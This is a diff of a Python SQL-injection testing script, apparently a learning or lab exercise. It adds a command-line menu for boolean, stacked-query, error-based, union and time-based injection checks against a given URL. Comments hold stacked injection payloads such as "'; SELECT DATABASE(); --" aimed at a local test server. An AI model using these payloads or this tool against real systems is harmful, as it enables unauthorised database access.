@@ -98,7 +98,7 @@ def check_time_based_attack(url):
 online = "https://my-securitytest.herokuapp.com/getFriend/user1"
 local = "http://localhost:3000/getFriend/user1"
 
-check_boolean_based_attack(local)
+# check_boolean_based_attack(local)
 # check_stack_query(online)
 # check__error_based_attack(online)
 # check_union_query_based_attack(online)
@@ -107,13 +107,34 @@ check_boolean_based_attack(local)
 # localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
 # localhost:3000/getFriend/user1'; SHOW TABLES; --%20
 
-#
-# commands = {
-#     'command1': ex1.check_stack_query,
-#     'command2': ex1.check_if_database_error_exposed
-# }
-#
-# if __name__ == '__main__':
-#     command = os.path.basename(sys.argv[0])
-#     if command in commands:
-#         commands[command](*sys.argv[1:])
+def help_info():
+    usage = 'Usage: python experiment.py [URL] [-Option]'
+    helper = "'-b': check_boolean_based_attack\n" \
+           "'-s': check_stack_query\n" \
+           "'-e': check__error_based_attack\n" \
+           "'-u': check_union_query_based_attack\n" \
+           "'-t': check_time_based_attack\n"
+    print usage + '\n' + helper
+
+
+commands = {
+    '-b': check_boolean_based_attack,
+    '-s': check_stack_query,
+    '-e': check__error_based_attack,
+    '-u': check_union_query_based_attack,
+    '-t': check_time_based_attack
+}
+
+
+
+
+if __name__ == '__main__':
+    if len(sys.argv) < 3:
+        if sys.argv[1] == '-h':
+            help_info()
+        else:
+            print 'Usage: python experiment.py [URL] [-Option]'
+    else:
+        command = os.path.basename(sys.argv[2])
+        if command in commands:
+            commands[command](sys.argv[1])
